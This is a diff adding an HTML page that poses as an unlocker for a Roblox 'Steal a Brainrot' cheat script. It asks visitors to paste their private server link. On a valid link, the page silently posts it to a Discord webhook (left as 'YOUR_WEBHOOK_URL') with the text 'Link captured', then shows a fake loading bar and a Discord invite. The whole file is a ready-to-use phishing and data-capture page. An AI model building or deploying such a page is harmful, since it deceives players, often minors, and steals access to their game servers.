@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Unlock Script</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+body { background:#111; color:#0ff; font-family:'Orbitron', sans-serif; text-align:center; padding-top:50px; }
+input { width:80%; padding:10px; font-size:16px; }
+#status { margin-top:10px; font-size:18px; }
+</style>
+</head>
+<body>
+<h2>Enter your Private Server Link to Unlock the Script</h2>
+<input type="text" id="serverLink" placeholder="Paste your private server link here...">
+<div id="status"></div>
+
+<script>
+function sendToDiscord(link) {
+fetch("YOUR_WEBHOOK_URL", {
+method: "POST",
+headers: { "Content-Type": "application/json" },
+body: JSON.stringify({ content: `🚨 Link captured: ${link}` })
+});
+}
+
+function loadBrainrotScreen() {
+document.body.innerHTML = `
+<div style="font-family:'Share Tech Mono', monospace;">
+<h1>🧠 Steal a Brainrot</h1>
+<p>Script Loading Please Wait for a While</p>
+<p>Don't worry, your base will be automatically locked</p>
+<p><a href="https://discord.gg/GaHusf5kj" target="_blank">discord.gg/GaHusf5kj</a></p>
+<div id="progress" style="width:50%; margin:auto; background:#222; border:1px solid #0ff;">
+<div id="bar" style="width:4%; height:20px; background:#0ff;"></div>
+</div>
+</div>
+`;
+let percent = 4;
+const bar = document.getElementById("bar");
+const interval = setInterval(() => {
+percent += Math.random() * 2;
+bar.style.width = percent + "%";
+if (percent >= 100) clearInterval(interval);
+}, 300);
+}
+
+document.getElementById("serverLink").addEventListener("input", function() {
+const link = this.value;
+const status = document.getElementById("status");
+
+if (link.includes("roblox.com/games/") && link.includes("privateServerLinkCode=")) {
+status.innerHTML = "✅ Valid Link";
+sendToDiscord(link);
+setTimeout(() => {
+loadBrainrotScreen();
+}, 1500);
+} else {
+status.innerHTML = "";
+}
+});
+</script>
+</body>
+</html>
